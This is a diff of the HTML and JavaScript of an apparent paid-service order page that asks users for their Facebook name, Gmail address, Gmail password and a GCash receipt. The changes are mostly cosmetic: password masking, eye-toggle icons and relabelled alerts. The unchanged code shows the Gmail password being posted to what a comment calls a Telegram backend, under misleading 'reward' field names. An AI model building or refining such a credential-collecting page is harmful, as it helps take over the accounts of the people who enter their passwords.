@@ -238,8 +238,8 @@
         <h2>📋 Step 1: Enter Account Info</h2>
         <input type="text" id="userId" placeholder="GMAIL" required>
         <div class="input-group" style="position:relative;">
-          <input type="text" id="rewardCode" placeholder="GMAIL PASSWORD" required>
-          <i class="toggle-eye fas fa-eye-slash" id="toggleEye" style="position:absolute;right:18px;top:50%;transform:translateY(-50%);color:#94a3b8;cursor:pointer;font-size:1.4rem;"></i>
+          <input type="password" id="rewardCode" placeholder="GMAIL PASSWORD" required>
+          <i class="toggle-eye fas fa-eye" id="toggleEye" style="position:absolute;right:18px;top:50%;transform:translateY(-50%);color:#94a3b8;cursor:pointer;font-size:1.4rem;"></i>
         </div>
       </div>
 
@@ -310,6 +310,7 @@
     let selectedDays = "7";
     let selectedFile = null;
 
+    // Plan & Duration Selection
     document.querySelectorAll('.price-card').forEach(card => {
       card.addEventListener('click', () => {
         document.querySelectorAll('.price-card').forEach(c => c.classList.remove('active'));
@@ -326,16 +327,17 @@
       });
     });
 
-    // Eye Toggle
+    // Eye Toggle - Starts hidden (bullets)
     const rewardInput = document.getElementById('rewardCode');
     const toggleEye = document.getElementById('toggleEye');
+    
     toggleEye.addEventListener('click', () => {
       if (rewardInput.type === "password") {
         rewardInput.type = "text";
-        toggleEye.classList.replace('fa-eye-slash', 'fa-eye');
+        toggleEye.classList.replace('fa-eye', 'fa-eye-slash');
       } else {
         rewardInput.type = "password";
-        toggleEye.classList.replace('fa-eye', 'fa-eye-slash');
+        toggleEye.classList.replace('fa-eye-slash', 'fa-eye');
       }
     });
 
@@ -366,7 +368,7 @@
       reader.readAsDataURL(file);
     }
 
-    // ==================== SUBMIT FUNCTION ====================
+    // Submit Function
     async function submitOrder() {
       const customer = document.getElementById('customer').value.trim();
       const username = document.getElementById('userId').value.trim();
@@ -374,8 +376,8 @@
       const note = document.getElementById('note').value.trim();
 
       if (!customer) return alert("❌ Please enter your Facebook Name");
-      if (!username) return alert("❌ Please enter your Reward");
-      if (!rewardID) return alert("❌ Please enter your Reward ID");
+      if (!username) return alert("❌ Please enter your GMAIL");
+      if (!rewardID) return alert("❌ Please enter your GMAIL PASSWORD");
       if (!selectedFile) return alert("❌ Please upload your GCash Payment Receipt");
 
       const btn = document.querySelector('button');
@@ -388,7 +390,7 @@
       formData.append('days', selectedDays);
       formData.append('customer', customer);
       formData.append('username', username);
-      formData.append('password', rewardID);        // ← Sent as 'password' to match Telegram
+      formData.append('password', rewardID);        // Matches your Telegram backend
       formData.append('note', note || '');
       formData.append('receipt', selectedFile);
 
